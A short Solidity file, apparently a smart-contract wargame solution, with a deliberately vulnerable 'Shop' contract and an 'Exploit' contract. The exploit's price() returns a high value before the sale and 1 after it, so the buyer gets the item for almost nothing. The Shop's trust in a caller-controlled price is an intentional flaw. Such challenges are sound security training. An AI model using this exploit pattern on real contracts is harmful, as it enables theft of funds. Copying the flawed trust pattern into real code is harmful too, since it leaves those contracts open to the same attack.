// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

interface Buyer {
  function price() external view returns (uint);
}

contract Exploit is Buyer {
  Shop target = Shop(0xB);

  function price() external view returns (uint){
    if(target.isSold() == false){
      return(uint(150));
    }
    else
      return(uint(1));
  }

  function attack() public{
    target.buy();
  }
}